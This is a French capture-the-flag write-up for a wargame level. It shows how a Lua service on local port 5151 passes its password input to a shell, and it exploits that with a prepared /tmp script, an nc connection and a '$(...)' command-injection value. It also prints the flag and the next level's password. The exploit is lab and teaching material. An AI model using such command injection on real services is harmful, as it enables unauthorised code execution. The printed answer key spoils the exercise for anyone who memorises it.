# Pré requis

aucun

## GET Flag

A la racine se trouve un fichier level11.lua.
Dans ce fichier se trouve le code execute en permanence par flag11.
La fonction de hash fait un appel systeme.
Il est donc possible d'injecter du code comme l'execution d'un script prepare avec les droits de flag11.
```
echo 'echo "$(getflag)" > /tmp/res11' > /tmp/exploit11
```

le code execute par flag11 ecoute sur le port 5151.
On peut donc lancer la commande:
```
nc 127.0.0.1 5151
```

Un mot de passe est attendu et sera transmit directement au shell.
```
$(/tmp/exploit11)
```

le resultat de la commande getflag sera ecrite dans le fichier `/tmp/res11`.

Qui nous donne : `fa6v5ateaw21peobuub8ipe6s`
# Flag

On obtient le flag:
`fa6v5ateaw21peobuub8ipe6s`
On peut se connecter sur le `level12`

```
level12
fa6v5ateaw21peobuub8ipe6s
```
